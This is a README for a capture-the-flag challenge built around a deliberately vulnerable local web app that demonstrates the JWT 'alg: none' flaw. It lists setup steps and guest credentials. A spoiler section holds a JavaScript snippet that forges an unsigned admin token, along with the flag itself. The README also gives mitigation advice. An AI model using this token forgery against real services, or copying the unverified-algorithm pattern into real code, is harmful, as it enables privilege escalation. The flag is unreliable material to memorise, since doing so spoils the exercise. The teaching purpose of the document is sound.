# The Broken Gatekeeper - CTF Challenge

A vulnerable web application demonstrating JWT algorithm confusion attacks.

## Setup

1. Install dependencies:
```bash
npm install
```

2. Start the server:
```bash
node server.js
```

3. Visit http://localhost:3000

## CTF Objective

**Goal:** Access `/admin/flag` as a guest user

**Credentials:**
- Username: `guest`
- Password: `guest123`

## Challenge Description

You've discovered a login portal for a secure system. As a guest user, you have limited access. Can you find a way to escalate your privileges and retrieve the admin flag?

**Hint:** The security of this system relies heavily on JWT tokens. Perhaps the implementation isn't as secure as it claims to be...

## Solution (Spoiler)

<details>
<summary>Click to reveal solution</summary>

This challenge exploits the JWT "alg: none" vulnerability:

1. Login as guest to get a valid JWT token
2. Decode the JWT (it has 3 parts separated by dots)
3. Modify the header to use `"alg": "none"` instead of `"HS256"`
4. Change the payload role from `"guest"` to `"admin"`
5. Remove the signature (keep the trailing dot)
6. Use the modified token to access `/admin/flag`

Example exploit:
```javascript
// Original token structure: header.payload.signature
// Modified token: modified_header.modified_payload.

const header = btoa(JSON.stringify({"alg":"none","typ":"JWT"}));
const payload = btoa(JSON.stringify({"username":"guest","role":"admin","iat":1234567890}));
const maliciousToken = `${header}.${payload}.`;

// Use this token in Authorization: Bearer header
```

The flag is: `TRACECTF{sl3pt_0n_k3yb04rd_g0t_f14g}`
</details>

## Learning Objectives

- Understanding JWT structure and components
- Recognizing algorithm confusion vulnerabilities
- Importance of proper JWT validation
- Never trust client-controlled algorithm selection

## Mitigation

In production code:
- Always specify allowed algorithms explicitly in verification
- Never allow "none" algorithm
- Use well-tested JWT libraries correctly
- Don't implement custom JWT parsing logic
